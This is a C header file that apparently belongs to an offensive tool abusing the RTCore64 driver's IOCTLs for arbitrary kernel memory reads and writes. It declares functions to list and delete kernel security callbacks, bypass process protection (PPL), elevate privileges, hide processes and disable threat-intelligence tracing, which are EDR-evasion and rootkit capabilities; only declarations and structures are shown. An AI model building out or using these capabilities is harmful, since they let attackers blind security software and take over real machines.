#ifndef UTILS_H
#define UTILS_H

#include <Windows.h>
#include "EzPdb.h"
#include <Psapi.h>
#include <tlhelp32.h>



#define IOCTL_WRITE		0x8000204C
#define IOCTL_READ		0x80002048


#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

//#define SystemModuleInformation 11





struct RtcoreRWStruct {
	BYTE	pad1[8]; // 0 --> 8
	DWORD64 Address; // 8 --> 16
	BYTE	pad2[8]; // 16--> 20
	DWORD32 castControl; // 24 --> 28
	DWORD32 Value; // 28 --> 36
	BYTE	pad3[16];
};


DWORD ReadPrimitive(HANDLE,DWORD64, DWORD32);

DWORD WritePrimitive(HANDLE, DWORD64, DWORD32, DWORD32);

BYTE Read8(HANDLE, DWORD64);

WORD Read16(HANDLE, DWORD64);

DWORD Read32(HANDLE, DWORD64);

DWORD64 Read64(HANDLE, DWORD64);

VOID ReadN(HANDLE hDevice, DWORD64 Address, DWORD Size, BYTE* retArr);


void Write8(HANDLE, DWORD64, BYTE);

void Write16(HANDLE, DWORD64, WORD);

void Write32(HANDLE, DWORD64, DWORD);

void Write64(HANDLE hDevice, DWORD64 Address, DWORD64 Value);

void WriteN(HANDLE hDevice, DWORD64 Address, BYTE* Value);


struct ModulesData {
    CHAR    moduleName[256];
    ULONG64 moduleBase;
};


typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
    PVOID Section;
    PVOID MappedBase;
    PVOID ImageBase;    // Base address of the module
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256]; // Full path of the module
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG ModulesCount;
    SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;



typedef struct _REGISTRY_CALLBACK_ITEM {
    LIST_ENTRY Item;
    DWORD64 Unknown1[2];
    DWORD64 Context;
    DWORD64 Function;
    DWORD64 Altitude[2];
    DWORD64 Unknown2[2];
} REGISTRY_CALLBACK_ITEM, * PREGISTRY_CALLBACK_ITEM;

typedef struct OB_CALLBACK_ENTRY_t {
    LIST_ENTRY CallbackList;                 // Linked into _OBJECT_TYPE.CallbackList
    DWORD Operations;                 // Types of operations (create, duplicate, etc.)
    DWORD Enabled;                            // Whether the callback is active
    DWORD64 Entry;             // Pointer to the main registration entry
    DWORD64 ObjectType;                 // Target object type (e.g., PsProcessType)
    DWORD64 PreOperation; // Callback before handle creation
    DWORD64 PostOperation;// Callback after handle creation
    DWORD64 Lock;                         // Synchronization mechanism
} OB_CALLBACK_ENTRY, * POB_CALLBACK_ENTRY;

//typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
//    ULONG SystemInformationClass,
//    PVOID SystemInformation,
//    ULONG SystemInformationLength,
//    PULONG ReturnLength
//    );


//typedef enum _SYSTEM_INFORMATION_CLASS {
//    SystemBasicInformation = 0,
//    SystemPerformanceInformation = 2,
//    SystemTimeOfDayInformation = 3,
//    SystemProcessInformation = 5,
//    SystemProcessorPerformanceInformation = 8,
//    SystemModuleInformation = 11,
//    SystemInterruptInformation = 23,
//    SystemExceptionInformation = 33,
//    SystemRegistryQuotaInformation = 37,
//    SystemLookasideInformation = 45,
//    SystemCodeIntegrityInformation = 103,
//    SystemPolicyInformation = 134,
//} SYSTEM_INFORMATION_CLASS;


EZPDB loadKernelOffsets();
ULONG_PTR GetKernelBaseAddress();
DWORD64 FindProcessId(const char* processName);

VOID ListProcCallback(HANDLE);
VOID ListThreadCallback(HANDLE hDevice);
VOID ListLoadImageCallback(HANDLE hDevice);
VOID ListRegCallback(HANDLE hDevice);
VOID ListObjCallback(HANDLE hDevice);

VOID DeleteProcCallback(HANDLE hDevice);
VOID DeleteThreadCallback(HANDLE hDevice);
VOID DeleteLoadImageCallback(HANDLE hDevice);
VOID DeleteRegCallback(HANDLE hDevice);
VOID DeleteObjCallback(HANDLE hDevice);


VOID BypassPpl(HANDLE hDevice, DWORD64 pid);
VOID elevateProc(HANDLE hDevice, DWORD64 pid);
VOID hideProc(HANDLE hDevice, DWORD64 pid);
VOID disableWTI(HANDLE hDevice);
#endif // !UTILS_H